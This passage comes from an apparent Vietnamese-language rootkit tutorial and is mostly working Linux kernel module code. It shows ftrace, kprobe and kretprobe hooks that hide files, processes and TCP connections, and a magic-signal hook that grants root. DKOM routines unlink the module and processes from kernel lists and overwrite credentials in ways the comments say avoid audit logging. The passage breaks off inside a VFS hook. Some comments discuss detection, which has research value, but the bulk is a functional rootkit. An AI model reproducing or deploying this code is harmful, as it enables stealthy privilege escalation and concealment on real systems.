/* ══════════════════════════════════════════════════════════════
 * HOOK INSTALLATION — Register ftrace handler cho target function
 * ══════════════════════════════════════════════════════════════ */

static int install_ftrace_hook(struct ftrace_hook *hook)
{
    int err;

    /* Step 1: Resolve target function address */
    hook->address = rk_lookup_name(hook->name);
    if (!hook->address) {
        pr_err("rk: ftrace cannot resolve %s\n", hook->name);
        return -ENOENT;
    }

    /* Step 2: Store original function address.
     *
     * hook->original là con trỏ tới con trỏ:
     *   hook->original = &orig_getdents64  (address của variable)
     *   *hook->original = hook->address     (ghi address vào variable)
     *
     * Sau dòng này:
     *   orig_getdents64 = address_of___x64_sys_getdents64
     *   → Hook function có thể gọi orig_getdents64(regs) */
    *((unsigned long *)hook->original) = hook->address;

    /* Step 3: Configure ftrace_ops.
     *
     * func: callback function (ftrace_thunk)
     *
     * flags:
     *   FTRACE_OPS_FL_SAVE_REGS: save tất cả registers vào pt_regs
     *     → Cần thiết để ta đọc/modify registers (đặc biệt regs->ip)
     *     → Nếu không set, regs = NULL trong callback
     *
     *   FTRACE_OPS_FL_IPMODIFY: khai báo rằng ta SẼ modify regs->ip
     *     → Kernel biết để handle conflict với tracers khác
     *     → Chỉ 1 IPMODIFY handler cho 1 function tại 1 thời điểm
     *     → Nếu tracing tool khác đã register IPMODIFY → ta fail
     *
     *   FTRACE_OPS_FL_RECURSION: (kernel 5.11+)
     *     → Cho phép recursion protection tự động
     *     → Trước 5.11 phải tự check (within_module trick) */
    hook->ops.func = ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
                    | FTRACE_OPS_FL_IPMODIFY;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 11, 0)
    hook->ops.flags |= FTRACE_OPS_FL_RECURSION;
#endif

    /* Step 4: Set filter — CHỈ trace target function.
     *
     * Không set filter = trace MỌI function = system crawl.
     * ftrace_set_filter_ip(): "chỉ gọi callback khi function
     * tại address này execute."
     *
     * Params:
     *   ops:     ftrace handle
     *   ip:      target function address
     *   remove:  0 = add filter, 1 = remove filter
     *   reset:   0 = append to existing, 1 = reset filter list */
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        pr_err("rk: ftrace_set_filter_ip failed: %d\n", err);
        return err;
    }

    /* Step 5: Register — Activate hook.
     *
     * Sau lệnh này, mỗi khi target function được gọi:
     * 1. CPU execute __fentry__ tại đầu function
     * 2. ftrace dispatch tới ftrace_thunk()
     * 3. ftrace_thunk() modify regs->ip → hook function
     * 4. CPU jump tới hook function thay vì tiếp tục original */
    err = register_ftrace_function(&hook->ops);
    if (err) {
        pr_err("rk: register_ftrace_function failed: %d\n", err);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }

    pr_info("rk: ftrace hook installed on %s @ 0x%lx\n",
            hook->name, hook->address);
    return 0;
}

static void remove_ftrace_hook(struct ftrace_hook *hook)
{
    int err;

    /* Unregister trong thứ tự ngược:
     * 1. Unregister function (stop calling callback)
     * 2. Remove filter (cleanup) */
    err = unregister_ftrace_function(&hook->ops);
    if (err)
        pr_err("rk: unregister_ftrace_function failed: %d\n", err);

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err)
        pr_err("rk: ftrace_set_filter_ip remove failed: %d\n", err);

    pr_info("rk: ftrace hook removed from %s\n", hook->name);
}

/* ══════════════════════════════════════════════════════════════
 * HOOK FUNCTIONS — Dùng với ftrace framework
 *
 * Hook functions cho ftrace GIỐNG với syscall table hooks,
 * nhưng cách install KHÁC.
 *
 * Ở đây ta hook 3 functions:
 * 1. __x64_sys_getdents64 — file/process hiding
 * 2. __x64_sys_kill — magic signal
 * 3. tcp4_seq_show — network connection hiding (deep hook)
 * ══════════════════════════════════════════════════════════════ */

/* Original function pointers — ftrace version */
static asmlinkage long (*ft_orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*ft_orig_kill)(const struct pt_regs *);
static int (*ft_orig_tcp4_seq_show)(struct seq_file *, void *);

/* Hook getdents64 — code giống Chapter 3 nhưng gọi ft_orig_* */
static asmlinkage long ft_hooked_getdents64(const struct pt_regs *regs)
{
    /* Reuse logic từ hooked_getdents64 ở Chapter 3,
     * thay orig_getdents64 bằng ft_orig_getdents64 */
    /* (Code getdents64 filtering ở đây — đã detail ở Chapter 3) */
    return ft_orig_getdents64(regs);
}

/* Hook kill — giống Chapter 3 */
static asmlinkage long ft_hooked_kill(const struct pt_regs *regs)
{
    pid_t target_pid = (pid_t)regs->di;
    int sig = (int)regs->si;

    if (sig == MAGIC_SIGNAL) {
        if (target_pid == MAGIC_PID) {
            struct cred *new_cred = prepare_creds();
            if (new_cred) {
                new_cred->uid.val = new_cred->gid.val = 0;
                new_cred->euid.val = new_cred->egid.val = 0;
                new_cred->suid.val = new_cred->sgid.val = 0;
                new_cred->cap_effective = CAP_FULL_SET;
                new_cred->cap_permitted = CAP_FULL_SET;
                new_cred->cap_inheritable = CAP_FULL_SET;
                commit_creds(new_cred);
            }
            return 0;
        }
    }
    return ft_orig_kill(regs);
}

/*
 * Hook tcp4_seq_show — ẨN NETWORK CONNECTIONS
 *
 * Đây là ưu điểm của ftrace: hook INTERNAL kernel function,
 * không chỉ syscalls. tcp4_seq_show() là function output mỗi dòng
 * trong /proc/net/tcp. Không thể hook function này qua syscall table.
 *
 * /proc/net/tcp là nơi netstat/ss đọc TCP connections.
 * Mỗi dòng = 1 connection. Ẩn dòng = ẩn connection.
 *
 * tcp4_seq_show(struct seq_file *seq, void *v):
 *   seq = output buffer (seq_file framework)
 *   v   = pointer tới current iteration element
 *         v == SEQ_START_TOKEN → header line
 *         v == struct sock *   → connection entry
 *
 * Flow: kernel iterate hash table → gọi tcp4_seq_show cho mỗi sock
 *       → output vào seq_file → user đọc /proc/net/tcp
 *
 * Hook: nếu sock->sk_num (local port) hoặc sk_dport (remote port)
 *       match HIDDEN_PORT → return 0 (skip, không output dòng này).
 */
static int ft_hooked_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk;

    /* Header line (column names) — luôn cho qua */
    if (v == SEQ_START_TOKEN)
        return ft_orig_tcp4_seq_show(seq, v);

    /* v là pointer tới struct inet_timewait_sock hoặc struct sock.
     * Cast an toàn vì tcp4_seq_show code gốc cũng cast tương tự. */
    sk = (struct sock *)v;

    /* Check ports.
     * sk_num  = local port (host byte order)
     * sk_dport = remote port (NETWORK byte order → cần ntohs)
     *
     * Tại sao khác byte order: sk_num được set bởi bind() đã convert.
     * sk_dport giữ nguyên từ packet header (network byte order). */
    if (sk->sk_num == HIDDEN_PORT ||
        ntohs(sk->sk_dport) == HIDDEN_PORT) {
        /* Return 0 = "đã xử lý" nhưng không output gì.
         * seq_file framework thấy return 0 → chuyển sang entry kế.
         * Dòng output cho connection này bị suppressed. */
        return 0;
    }

    return ft_orig_tcp4_seq_show(seq, v);
}

/* Hook udp4_seq_show tương tự cho UDP connections (nếu cần) */

/* ══════════════════════════════════════════════════════════════
 * HOOK TABLE — Khai báo tất cả hooks
 * ══════════════════════════════════════════════════════════════ */

static struct ftrace_hook ft_hooks[] = {
    HOOK(SYSCALL_PREFIX "getdents64",
         ft_hooked_getdents64, &ft_orig_getdents64),
    HOOK(SYSCALL_PREFIX "kill",
         ft_hooked_kill, &ft_orig_kill),
    HOOK("tcp4_seq_show",
         ft_hooked_tcp4_seq_show, &ft_orig_tcp4_seq_show),
};

/* Install all hooks */
int rk_ftrace_install(void)
{
    int i, err;

    for (i = 0; i < ARRAY_SIZE(ft_hooks); i++) {
        err = install_ftrace_hook(&ft_hooks[i]);
        if (err) {
            /* Rollback: remove hooks đã install */
            while (--i >= 0)
                remove_ftrace_hook(&ft_hooks[i]);
            return err;
        }
    }
    return 0;
}

/* Remove all hooks */
void rk_ftrace_remove(void)
{
    int i;
    for (i = 0; i < ARRAY_SIZE(ft_hooks); i++)
        remove_ftrace_hook(&ft_hooks[i]);
}
```

---

## Chapter 5: Kprobe/Kretprobe Hooking

```c
/* kprobe_hooks.c — Kprobe-based hooking
 *
 * Kprobes = Kernel Probes. Debug framework cho phép chèn
 * breakpoint tại bất kỳ instruction nào trong kernel.
 *
 * SO SÁNH VỚI FTRACE:
 *   Kprobe:  hook tại BẤT KỲ instruction, không chỉ function entry
 *            → flexible hơn (hook giữa function, hook specific instructions)
 *   Ftrace:  chỉ hook tại function entry (__fentry__)
 *            → cleaner API, ít overhead
 *
 * Kprobe types:
 *   1. kprobe:     trigger tại INSTRUCTION — chạy handler TRƯỚC instruction
 *   2. kretprobe:  trigger tại FUNCTION RETURN — chạy handler TRƯỚC return
 *   3. jprobe:     deprecated (removed trong kernel 4.15)
 *
 * Kretprobe đặc biệt hữu ích cho rootkit:
 *   → hook function return → modify RETURN VALUE
 *   → Ví dụ: sys_getdents64 return count → giảm count = ẩn entries
 *
 * CÁCH KPROBE HOẠT ĐỘNG (internal):
 *
 *   1. Kernel save instruction gốc tại probe point
 *   2. Replace bằng INT3 (0xCC) — breakpoint instruction
 *   3. Khi CPU hit INT3 → trap handler chạy
 *   4. Trap handler gọi registered kprobe handlers
 *   5. Execute original instruction (single-step)
 *   6. Continue execution
 *
 *   Kretprobe additionally:
 *   1. Replace return address trên stack bằng trampoline
 *   2. Khi function return → jump tới trampoline
 *   3. Trampoline gọi kretprobe handler
 *   4. Handler có thể modify return value (regs->ax)
 *   5. Jump tới original return address
 *
 * Detection:
 *   /sys/kernel/debug/kprobes/list — liệt kê mọi active kprobes
 *   → Admin check file này = thấy rootkit hooks
 *   → Rootkit nâng cao: hook việc ĐỌC file này :)
 */

#include "rootkit.h"

/* ══════════════════════════════════════════════════════════════
 * KRETPROBE: Hook sys_getdents64 RETURN
 *
 * Kretprobe hook tại RETURN POINT. Khi sys_getdents64() chuẩn bị
 * return, handler chạy → có thể modify return value và data.
 *
 * Ưu điểm so với pre-hook:
 *   - Data đã trong userspace buffer → modify trước khi user thấy
 *   - Return value (count) có thể giảm → phản ánh filtered data
 *   - Không cần biết function internals, chỉ cần biết output
 *
 * Vấn đề:
 *   - Kretprobe có giới hạn maxactive (concurrent instances)
 *   - Nếu vượt maxactive → handler bị miss cho một số calls
 *   - Set maxactive cao = dùng nhiều memory
 * ══════════════════════════════════════════════════════════════ */

/* Instance data — lưu thông tin giữa entry và return.
 *
 * Khi function entry: save arguments (vì registers sẽ bị overwrite)
 * Khi function return: dùng saved arguments để xử lý
 *
 * Mỗi concurrent call có instance data riêng (per-invocation storage).
 */
struct getdents64_data {
    struct linux_dirent64 __user *dirent;  /* Saved userspace buffer pointer */
    int fd;                                 /* Saved file descriptor */
};

/*
 * Entry handler — chạy khi sys_getdents64 BẮT ĐẦU execute.
 *
 * Mục đích: save arguments trước khi bị overwrite bởi function body.
 * Trong kretprobe, handler chỉ chạy lúc RETURN — lúc đó registers
 * đã thay đổi, không còn arguments. Nên phải save ở entry.
 *
 * ri->data: pointer tới instance storage (struct getdents64_data)
 *           Mỗi concurrent invocation có data riêng.
 */
static int getdents64_entry(struct kretprobe_instance *ri,
                             struct pt_regs *regs)
{
    struct getdents64_data *data =
        (struct getdents64_data *)ri->data;

    /* Save arguments từ registers.
     * regs->di = arg1 (fd)
     * regs->si = arg2 (dirent buffer pointer)
     * Cần save vì lúc return, di/si đã bị overwrite. */
    data->fd     = (int)regs->di;
    data->dirent = (struct linux_dirent64 __user *)regs->si;

    return 0;  /* 0 = proceed, non-zero = skip this invocation */
}

/*
 * Return handler — chạy khi sys_getdents64 CHUẨN BỊ return.
 *
 * Tại thời điểm này:
 *   - Function đã execute xong
 *   - Return value = regs->ax (total bytes of dirent data)
 *   - Userspace buffer đã được fill bởi kernel
 *   - Ta có thể modify buffer VÀ return value
 */
static int getdents64_return(struct kretprobe_instance *ri,
                              struct pt_regs *regs)
{
    struct getdents64_data *data =
        (struct getdents64_data *)ri->data;

    long ret = regs_return_value(regs);  /* = regs->ax = return value */
    struct linux_dirent64 *kern_buf;
    struct linux_dirent64 *current_entry, *prev_entry;
    unsigned long offset;

    if (ret <= 0)
        return 0;

    kern_buf = kzalloc(ret, GFP_ATOMIC);
    /* GFP_ATOMIC: kretprobe handler CÓ THỂ chạy trong atomic context
     * (nơi không thể sleep). GFP_KERNEL sẽ crash nếu need to sleep.
     * GFP_ATOMIC có thể fail nếu hết memory → check NULL. */
    if (!kern_buf)
        return 0;

    if (copy_from_user(kern_buf, data->dirent, ret)) {
        kfree(kern_buf);
        return 0;
    }

    /* Filtering logic — giống hooked_getdents64 trong Chapter 3.
     * Lặp lại ở đây cho completeness. */
    offset = 0;
    prev_entry = NULL;
    while (offset < ret) {
        current_entry = (void *)kern_buf + offset;

        bool hide = false;

        if (strncmp(current_entry->d_name, HIDDEN_PREFIX,
                    strlen(HIDDEN_PREFIX)) == 0)
            hide = true;

        if (hide) {
            if (current_entry == kern_buf) {
                ret -= current_entry->d_reclen;
                memmove(current_entry,
                        (char *)current_entry + current_entry->d_reclen,
                        ret);
                continue;
            }
            prev_entry->d_reclen += current_entry->d_reclen;
        } else {
            prev_entry = current_entry;
        }
        offset += current_entry->d_reclen;
    }

    copy_to_user(data->dirent, kern_buf, ret);
    kfree(kern_buf);

    /* MODIFY RETURN VALUE.
     * 
     * regs->ax = return value trên x86-64.
     * Set = filtered size. Nếu không modify, userspace thấy
     * original count nhưng buffer đã bị truncate → confusion. */
    regs->ax = ret;

    return 0;
}

static struct kretprobe getdents64_probe = {
    .handler         = getdents64_return,
    .entry_handler   = getdents64_entry,
    .data_size       = sizeof(struct getdents64_data),

    /* maxactive: maximum concurrent invocations.
     *
     * Nếu 20 processes đồng thời gọi getdents64,
     * probe xử lý 20 cái cùng lúc. Nếu >20, cái thừa bị miss.
     *
     * Chọn giá trị:
     *   - Quá nhỏ: miss hooks trên busy systems
     *   - Quá lớn: waste memory (mỗi instance = sizeof(data) bytes)
     *   - 20-50 thường đủ cho server workloads */
    .maxactive       = 20,

    .kp.symbol_name  = SYSCALL_PREFIX "getdents64",
};

/* ══════════════════════════════════════════════════════════════
 * KPROBE: Hook sys_execve — Log mọi process execution
 *
 * Pre-handler: chạy TRƯỚC instruction tại probe point.
 *
 * Use case: monitoring (log mọi exec) hoặc filtering
 * (block specific binaries).
 *
 * APT use case: log mọi command người dùng chạy → credential
 * harvesting, lateral movement intelligence.
 * ══════════════════════════════════════════════════════════════ */

static int execve_pre_handler(struct kprobe *p, struct pt_regs *regs)
{
    char __user *user_filename = (char __user *)regs->di;
    char filename[256];

    /* strncpy_from_user(): copy string từ userspace.
     * Return: số bytes copied, hoặc negative error.
     * An toàn hơn copy_from_user vì handle null-termination. */
    long len = strncpy_from_user(filename, user_filename,
                                  sizeof(filename) - 1);
    if (len > 0) {
        filename[len] = '\0';

        /* Log execution. Trong rootkit thật, gửi qua covert channel
         * thay vì printk (vì printk visible trong dmesg). */
        pr_info("rk: exec: %s by %s[%d] uid=%d\n",
                filename,
                current->comm,          /* Process name */
                current->pid,           /* PID */
                current_uid().val);     /* User ID */

        /* Advanced: filter execution.
         * Return non-zero từ pre_handler KHÔNG block execution.
         * Để block: phải modify regs (set return address, etc.)
         * Hoặc dùng kretprobe + modify return value = -EPERM. */
    }

    return 0;
}

static struct kprobe execve_kp = {
    .symbol_name = SYSCALL_PREFIX "execve",
    .pre_handler = execve_pre_handler,
};

/* ══════════════════════════════════════════════════════════════
 * KRETPROBE: Hook tcp_connect — Monitor/hide outbound connections
 *
 * Hook tcp_v4_connect() thay vì sys_connect() — sâu hơn,
 * bypass userland tools mà chỉ trace syscalls.
 *
 * tcp_v4_connect() là internal function handle TCP connection setup.
 * Hooked tại đây nghĩa là ta thấy connection TRƯỚC khi bất kỳ
 * userland monitoring tool nào.
 * ══════════════════════════════════════════════════════════════ */

struct tcp_connect_data {
    struct sock *sk;
};

static int tcp_connect_entry(struct kretprobe_instance *ri,
                              struct pt_regs *regs)
{
    struct tcp_connect_data *data =
        (struct tcp_connect_data *)ri->data;

    /* tcp_v4_connect(struct sock *sk, struct sockaddr *uaddr, int addr_len)
     * regs->di = struct sock * */
    data->sk = (struct sock *)regs->di;
    return 0;
}

static int tcp_connect_return(struct kretprobe_instance *ri,
                               struct pt_regs *regs)
{
    struct tcp_connect_data *data =
        (struct tcp_connect_data *)ri->data;
    struct sock *sk = data->sk;
    long retval = regs_return_value(regs);

    if (retval == 0 && sk) {
        /* Connection successful — log details */
        unsigned int daddr = sk->sk_daddr;     /* Destination IP */
        unsigned short dport = ntohs(sk->sk_dport); /* Dest port */
        unsigned short sport = sk->sk_num;      /* Source port */

        pr_info("rk: TCP connect %pI4:%u → %pI4:%u\n",
                &sk->sk_rcv_saddr, sport,    /* %pI4 = print IPv4 */
                &daddr, dport);
    }

    return 0;
}

static struct kretprobe tcp_connect_probe = {
    .handler       = tcp_connect_return,
    .entry_handler = tcp_connect_entry,
    .data_size     = sizeof(struct tcp_connect_data),
    .maxactive     = 50,
    .kp.symbol_name = "tcp_v4_connect",
};

/* ══════════════════════════════════════════════════════════════
 * LIFECYCLE
 * ══════════════════════════════════════════════════════════════ */

int rk_kprobe_install(void)
{
    int err;

    err = register_kretprobe(&getdents64_probe);
    if (err) {
        pr_err("rk: getdents64 kretprobe failed: %d\n", err);
        return err;
    }

    err = register_kprobe(&execve_kp);
    if (err) {
        pr_err("rk: execve kprobe failed: %d\n", err);
        unregister_kretprobe(&getdents64_probe);
        return err;
    }

    err = register_kretprobe(&tcp_connect_probe);
    if (err) {
        pr_err("rk: tcp_connect kretprobe failed: %d\n", err);
        unregister_kprobe(&execve_kp);
        unregister_kretprobe(&getdents64_probe);
        return err;
    }

    pr_info("rk: kprobe hooks installed\n");
    return 0;
}

void rk_kprobe_remove(void)
{
    unregister_kretprobe(&tcp_connect_probe);
    unregister_kprobe(&execve_kp);
    unregister_kretprobe(&getdents64_probe);

    /* Sau unregister, đợi in-flight handlers hoàn thành.
     * synchronize_rcu() đảm bảo mọi CPU đã exit handler. */
    synchronize_rcu();

    pr_info("rk: kprobe hooks removed\n");
}
```

---

## Chapter 6: DKOM — Direct Kernel Object Manipulation

```c
/* dkom.c — Direct Kernel Object Manipulation
 *
 * DKOM = Thay đổi kernel data structures trực tiếp, KHÔNG hook function.
 *
 * Tại sao DKOM đáng sợ:
 *   1. KHÔNG thay đổi code → code integrity checks PASS
 *   2. KHÔNG hook function → hook detection tools PASS
 *   3. Nhanh — chỉ modify vài pointers
 *   4. Khó detect ngoại trừ memory forensics
 *
 * Tại sao DKOM khó:
 *   1. Phải biết exact struct layout (thay đổi theo kernel version)
 *   2. Race conditions — cần proper locking
 *   3. Inconsistency detection — cross-view analysis sẽ phát hiện
 *   4. Potential crash nếu kernel iterate modified structures
 *
 * APT sử dụng: hầu hết kernel rootkits dùng DKOM ít nhất cho
 * module hiding (list_del). Advanced rootkits dùng DKOM cho
 * process hiding, credential manipulation.
 */

#include "rootkit.h"

/* ══════════════════════════════════════════════════════════════
 * MODULE HIDING via DKOM
 *
 * Kernel module list là doubly-linked list:
 *   module1 ↔ module2 ↔ rootkit ↔ module3
 *
 * Sau DKOM:
 *   module1 ↔ module2 ↔ module3
 *   rootkit (orphaned — không ai reference, nhưng code vẫn trong memory)
 *
 * Ẩn khỏi:
 *   - lsmod (đọc module list)
 *   - /proc/modules (đọc module list)
 *   - /sys/module/MODULE_NAME (kobject tree)
 *   - modinfo MODULE_NAME (cần module trong list)
 * ══════════════════════════════════════════════════════════════ */

/* Save pointers để có thể restore (show module lại cho rmmod) */
static struct list_head *saved_prev_module = NULL;
static bool module_is_hidden = false;

/*
 * Ẩn module hiện tại khỏi tất cả views.
 *
 * Phải ẩn từ 3 nơi:
 * 1. Module list (THIS_MODULE->list) — lsmod, /proc/modules
 * 2. Kobject tree (THIS_MODULE->mkobj.kobj) — /sys/module/
 * 3. Module section attributes — /sys/module/MODULE/sections/
 */
void rk_hide_module(void)
{
    if (module_is_hidden)
        return;

    /* Save previous node để restore sau.
     *
     * List structure:
     *   prev ↔ THIS_MODULE ↔ next
     *
     * saved_prev_module = prev → dùng khi cần re-insert.
     */
    saved_prev_module = THIS_MODULE->list.prev;

    /* 1. Xóa khỏi module list.
     *
     * list_del_init():
     *   - Unlink node khỏi doubly-linked list
     *     prev->next = next
     *     next->prev = prev
     *   - Init node: next = prev = &self (empty list)
     *
     * Tại sao list_del_init thay vì list_del:
     *   list_del set next/prev = LIST_POISON1/2 — debug values.
     *   Nếu ai check list structure → phát hiện poison values.
     *   list_del_init set next/prev = &self → looks like empty list.
     *
     * Sau dòng này:
     *   - lsmod KHÔNG thấy module
     *   - /proc/modules KHÔNG có entry
     *   - Nhưng module code VẪN trong memory, VẪN execute
     */
    list_del_init(&THIS_MODULE->list);

    /* 2. Xóa khỏi kobject tree (/sys/module/).
     *
     * kobject = kernel object representation cho sysfs.
     * Mỗi module có kobject tại /sys/module/MODULE_NAME/
     * chứa: parameters, sections, notes, etc.
     *
     * kobject_del() removes sysfs entry:
     *   - /sys/module/rk/ biến mất
     *   - ls /sys/module/ không liệt kê
     *
     * CẢNH BÁO: sau kobject_del, không thể dùng sysfs features.
     * Module parameters qua sysfs sẽ không accessible. */
    kobject_del(&THIS_MODULE->mkobj.kobj);

    /* 3. (Optional) Xóa khỏi /proc/modules text output.
     *
     * /proc/modules output generated từ module list iteration.
     * list_del ở trên đã handle điều này.
     * Nhưng nếu paranoid: hook seq_show của /proc/modules. */

    module_is_hidden = true;
    pr_info("rk: module hidden\n");
}

/*
 * Hiện module lại — cần trước khi rmmod.
 *
 * rmmod gọi find_module(name) → iterate module list → tìm module.
 * Nếu module không trong list → rmmod báo "module not found".
 *
 * Flow để unload:
 *   1. Trigger show (kill -54 31338)
 *   2. rmmod rk
 *   3. Module exit handler cleanup hooks
 */
void rk_show_module(void)
{
    if (!module_is_hidden || !saved_prev_module)
        return;

    /* Re-insert vào module list SAU node đã save.
     *
     * list_add(&THIS_MODULE->list, saved_prev_module):
     *   Insert THIS_MODULE after saved_prev_module.
     *   saved_prev → THIS_MODULE → (original next)
     *
     * Module giờ visible lại cho lsmod, /proc/modules. */
    list_add(&THIS_MODULE->list, saved_prev_module);

    /* Kobject KHÔNG restore — sysfs entry đã bị destroy.
     * Tạo lại kobject phức tạp và không cần thiết cho rmmod.
     * rmmod chỉ cần module trong list, không cần sysfs. */

    module_is_hidden = false;
    pr_info("rk: module shown\n");
}

/* ══════════════════════════════════════════════════════════════
 * PROCESS HIDING via DKOM
 *
 * Cách ps/top hoạt động:
 *   1. Mở /proc (procfs directory)
 *   2. getdents64 → list tất cả entries (bao gồm PID directories)
 *   3. Mỗi PID directory → read status, stat, cmdline, etc.
 *
 * Syscall table hook (Chapter 3) ẩn ở bước 2 (filter getdents64).
 * DKOM ẩn ở level sâu hơn: xóa process khỏi internal list.
 *
 * Linux process list:
 *   init_task.tasks ↔ task1.tasks ↔ task2.tasks ↔ ... ↔ init_task.tasks
 *   (Circular doubly-linked list, anchored at init_task)
 *
 * Xóa task khỏi list:
 *   - for_each_process() không thấy → /proc/PID không generated
 *   - ps, top, htop không thấy
 *   - kill PID vẫn work (kernel còn hash table riêng cho PID lookup)
 *   - Process VẪN chạy (scheduler dùng run queue, không phải task list)
 * ══════════════════════════════════════════════════════════════ */

/* Saved state cho process unhiding */
struct hidden_proc {
    pid_t pid;
    struct list_head *saved_prev;
    struct hidden_proc *next;
};

static struct hidden_proc *hidden_proc_list = NULL;
static DEFINE_SPINLOCK(proc_hide_lock);

void rk_hide_process(pid_t pid)
{
    struct task_struct *task;
    struct hidden_proc *hp;

    /* Tìm task_struct by PID.
     *
     * rcu_read_lock(): bắt đầu RCU read-side critical section.
     * Task structures được protect bởi RCU — đảm bảo task
     * không bị freed trong khi ta đang access.
     *
     * find_vpid(): tìm struct pid trong PID namespace.
     * pid_task(): convert struct pid → task_struct.
     * PIDTYPE_PID: tìm theo PID (không phải PGID hay SID). */
    rcu_read_lock();
    task = pid_task(find_vpid(pid), PIDTYPE_PID);

    if (!task) {
        rcu_read_unlock();
        pr_warn("rk: PID %d not found\n", pid);
        return;
    }

    /* Save state cho unhiding */
    hp = kzalloc(sizeof(*hp), GFP_ATOMIC);
    if (!hp) {
        rcu_read_unlock();
        return;
    }

    hp->pid = pid;
    hp->saved_prev = task->tasks.prev;

    /* Xóa khỏi task list.
     *
     * CẢNH BÁO QUAN TRỌNG:
     *   list_del trên task->tasks CÓ THỂ gây issues:
     *   1. Một số kernel code iterate task list (OOM killer, procfs)
     *      → crash nếu gặp broken list
     *   2. Process accounting tool ghi log → miss hidden process
     *   3. waitpid() cho child processes có thể bị ảnh hưởng
     *
     *   Trong production rootkit (APT), thường dùng getdents64 hook
     *   thay vì DKOM cho process hiding — ít risky hơn.
     *   DKOM process hiding chủ yếu dùng cho research/demo. */
    list_del_init(&task->tasks);

    rcu_read_unlock();

    /* Add vào hidden process list */
    spin_lock(&proc_hide_lock);
    hp->next = hidden_proc_list;
    hidden_proc_list = hp;
    spin_unlock(&proc_hide_lock);

    pr_info("rk: PID %d hidden via DKOM\n", pid);
}

void rk_show_process(pid_t pid)
{
    struct task_struct *task;
    struct hidden_proc **pp, *hp;

    spin_lock(&proc_hide_lock);
    for (pp = &hidden_proc_list; *pp; pp = &(*pp)->next) {
        if ((*pp)->pid == pid) {
            hp = *pp;
            *pp = hp->next;
            spin_unlock(&proc_hide_lock);

            /* Re-insert task vào list */
            rcu_read_lock();
            task = pid_task(find_vpid(pid), PIDTYPE_PID);
            if (task && hp->saved_prev)
                list_add(&task->tasks, hp->saved_prev);
            rcu_read_unlock();

            kfree(hp);
            pr_info("rk: PID %d shown via DKOM\n", pid);
            return;
        }
    }
    spin_unlock(&proc_hide_lock);
}

/* ══════════════════════════════════════════════════════════════
 * CREDENTIAL MANIPULATION via DKOM
 *
 * Thay vì prepare_creds/commit_creds (API approach),
 * trực tiếp modify cred struct trong memory.
 *
 * TẠI SAO KHÔNG NÊN LÀM CÁCH NÀY:
 *   - cred struct là immutable by design (multiple readers via RCU)
 *   - Trực tiếp modify → race condition với code đang đọc cred
 *   - prepare_creds/commit_creds handle locking đúng cách
 *
 * TẠI SAO VẪN DEMO:
 *   - Hiểu sâu hơn về credential model
 *   - Một số rootkit thực tế dùng cách này
 *   - Bypasses audit logging (commit_creds có audit hook)
 * ══════════════════════════════════════════════════════════════ */

static void rk_dkom_give_root(struct task_struct *task)
{
    struct cred *cred;

    /* current->cred là const pointer — không thể modify trực tiếp.
     * Cast bỏ const = undefined behavior theo C standard.
     * Nhưng trong kernel context, ta có toàn quyền memory access. */
    cred = (struct cred *)task->cred;

    /* Trực tiếp overwrite credential fields.
     * KHÔNG qua prepare_creds/commit_creds:
     *   + Không tạo audit record (stealthier)
     *   + Không allocate memory (no failure case)
     *   - Potential race condition
     *   - Violates kernel credential model
     *   - Có thể corrupt state nếu concurrent reader */

    cred->uid.val = 0;
    cred->gid.val = 0;
    cred->euid.val = 0;
    cred->egid.val = 0;
    cred->suid.val = 0;
    cred->sgid.val = 0;
    cred->fsuid.val = 0;
    cred->fsgid.val = 0;

    cred->cap_effective = CAP_FULL_SET;
    cred->cap_permitted = CAP_FULL_SET;
    cred->cap_inheritable = CAP_FULL_SET;
    cred->cap_bset = CAP_FULL_SET;
    cred->cap_ambient = CAP_FULL_SET;
}
```

---

## Chapter 7: VFS Layer Hooking

```c
/* vfs_hook.c — VFS (Virtual File System) layer hooking
 *
 * Hook ở VFS layer = sâu hơn syscall table hook.
 *
 * Hierarchy:
 *   Syscall: sys_getdents64 → vfs_readdir → file->f_op->iterate_shared
 *   Hook tại f_op level bypass detection dựa trên syscall table check.
 *
 * VFS Architecture:
 *   Mỗi open file → struct file → f_op (file_operations)
 *   f_op chứa function pointers cho mọi operation trên file.
 *
 *   Cụ thể cho directories:
 *   f_op->iterate_shared() = read directory entries
 *   Hook iterate_shared → control output của readdir/getdents
 *
 * procfs (/proc) dùng VFS — mỗi /proc entry có riêng f_op.
 * Hook f_op của /proc root directory → control /proc listing
 * → ẩn process mà không cần hook syscall table.
 */

#include "rootkit.h"

/* ══════════════════════════════════════════════════════════════
 * Hook iterate_shared trên /proc directory
 *
 * Khi ls /proc, kernel gọi:
 *   proc_root.f_op->iterate_shared(file, ctx)
 *
 * iterate_shared dùng callback pattern:
 *   Kernel iterate entries → cho mỗi entry gọi ctx->actor
 *   actor = filldir function (ghi entry vào user buffer)
 *
 * Hook strategy:
 *   1. Lấy original iterate_shared và original filldir
 *   2. Replace iterate_shared → hooked version
 *   3. Hooked version thay ctx->actor bằng custom filldir
 *   4. Custom filldir filter entries trước khi pass tới original filldir
 * ══════════════════════════════════════════════════════════════ */

static int (*orig_proc_iterate)(struct file *, struct dir_context *);
static filldir_t orig_proc_filldir;

/*
 * Custom filldir — called cho mỗi entry trong /proc
 *
 * dir_context callback signature:
 *   int filldir(struct dir_context *ctx, const char *name, int namlen,
 *               loff_t offset, u64 ino, unsigned int d_type)
 *
 * name    = entry name (e.g., "1234" for PID 1234, "cpuinfo", "meminfo")
 * namlen  = length of name
 * d_type  = DT_DIR, DT_REG, etc.
 *
 * Return: 0 = success, keep iterating. Non-zero = stop.
 * Nếu ta return 0 mà KHÔNG gọi orig_filldir → entry bị skip (ẩn).
 */
static bool rk_proc_filldir(struct dir_context *ctx,
                              const char *name, int namlen,
                              loff_t offset, u64 ino,
                              unsigned int d_type)
{
    /* Case 1: Ẩn PID directory */
    if (d_type == DT_DIR) {
        long pid_val;
        char pid_str[16];

        /* Copy name vì kstrtol cần null-terminated string.
         * name từ kernel đã null-terminated nhưng safe practice. */
        if (namlen < sizeof(pid_str)) {
            memcpy(pid_str, name, namlen);
            pid_str[namlen] = '\0';

            if (kstrtol(pid_str, 10, &pid_val) == 0) {
